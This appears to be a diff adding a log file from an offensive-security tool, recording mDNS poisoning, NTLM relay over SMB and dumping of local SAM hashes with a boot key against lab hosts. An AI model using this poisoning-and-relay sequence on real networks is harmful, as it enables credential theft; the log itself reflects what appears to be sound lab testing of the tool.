+2021-11-23 11:52:24.902 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:32.797 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:52:32.834 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:38.373 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:52:38.406 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:57.288 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:52:57.322 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:58.283 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:52:58.342 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:58.494 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-10: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:52:59.375 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI FAILED
+2021-11-23 11:53:08.488 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:53:08.522 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:53:09.519 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-11: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:53:09.533 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI FAILED
+2021-11-23 11:53:30.221 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:53:37.988 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:53:37.989 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:53:38.002 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:53:53.333 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:53:53.366 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:53:54.389 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:53:54.502 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI FAILED
+2021-11-23 11:54:03.494 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:54:03.526 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:54:04.541 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:54:04.597 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI FAILED
+2021-11-23 11:54:09.175 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:54:09.214 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:54:10.231 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-10: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:54:10.270 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI FAILED
+2021-11-23 11:57:09.489 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:57:09.588 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:57:14.885 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 11:57:15.242 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 11:57:29.496 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 11:57:29.535 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 12:01:15.686 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 12:01:15.722 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 12:01:15.976 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:01:16.007 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:01:28.277 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 12:01:28.314 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 12:01:29.612 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:01:29.650 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:01:30.186 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 12:01:30.218 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 12:02:07.279 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:02:07.318 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:02:08.821 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-11: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:02:09.105 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:02:09.111 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-11: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:02:09.142 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:02:09.182 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:02:09.241 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:02:09.304 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:02:10.551 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:02:10.863 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:02:12.297 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:02:12.313 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:02:16.053 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:02:50.465 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:02:50.466 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:02:50.476 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:02:56.072 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:02:56.106 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:02:57.085 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:02:57.157 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:02:57.160 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:02:57.184 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:02:57.192 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:02:58.302 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:02:58.542 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:02:59.518 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:02:59.523 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:03:02.637 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:04:56.953 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:04:56.954 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:04:56.964 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:05:06.211 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:05:06.254 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:05:07.229 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:05:07.258 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:05:07.271 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:05:07.322 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:05:07.337 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:05:07.339 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:05:07.370 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:05:08.350 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:05:08.476 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:05:09.310 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:05:09.789 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:05:09.794 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:05:12.021 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:06:00.982 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 12:06:13.437 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:06:13.439 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:06:13.448 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:06:22.777 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:06:22.814 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:06:23.762 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:06:23.796 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:06:23.834 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:06:23.957 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:06:23.976 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:06:24.117 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:06:24.127 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:06:25.288 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:06:25.570 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:06:26.542 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:06:26.556 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:06:28.645 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:07:30.270 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:07:30.272 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:07:30.285 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:07:37.739 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:07:37.779 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:07:38.749 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:07:38.786 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:07:38.796 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:07:38.892 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:07:38.936 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:07:40.180 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:07:40.407 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:07:41.090 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:07:41.115 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:07:45.401 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:09:33.286 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:09:33.291 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:09:33.305 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:09:40.115 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:09:40.154 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:09:41.125 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:09:41.158 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:09:41.170 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:09:41.218 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:09:41.232 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:09:42.331 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:09:42.517 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:09:43.064 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:09:43.084 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:09:44.609 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:13:51.861 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:13:51.862 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:13:51.874 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:13:57.872 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:13:57.914 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:13:58.892 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:13:58.979 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:13:59.001 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:13:59.009 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:13:59.019 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:14:00.147 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:14:00.193 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:14:00.814 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:14:00.818 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:14:03.717 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:14:20.400 | ERROR    | project.igris:do_cd:180 - /tm is not a directory
+2021-11-23 12:14:29.694 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-23 12:14:31.825 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:14:31.827 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:14:31.841 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:14:42.873 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:14:42.906 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:14:43.894 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:14:43.925 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:14:43.933 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:14:43.994 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:14:44.000 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:14:45.087 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:14:45.155 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:14:45.812 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:14:45.828 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:14:47.229 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:16:10.153 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-23 12:16:11.491 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 12:16:11.485 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 12:16:11.503 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 12:16:19.638 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 12:16:19.670 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 12:16:20.657 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 12:16:20.684 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 12:16:20.698 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 12:16:20.727 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 12:16:20.742 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 12:16:21.946 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 12:16:22.176 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 12:16:23.092 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 12:16:23.112 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 12:16:24.645 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 12:16:35.119 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/loot is not a directory
+2021-11-26 09:55:05.254 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-26 09:55:05.256 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-26 09:55:05.415 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 09:55:15.735 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-26 09:55:15.768 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-26 09:55:16.692 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 09:55:17.473 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI FAILED
+2021-11-26 09:55:23.526 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-26 10:20:54.519 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-26 10:20:54.522 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-26 10:20:54.531 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 10:21:32.472 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-26 10:21:32.512 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-26 10:21:33.674 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
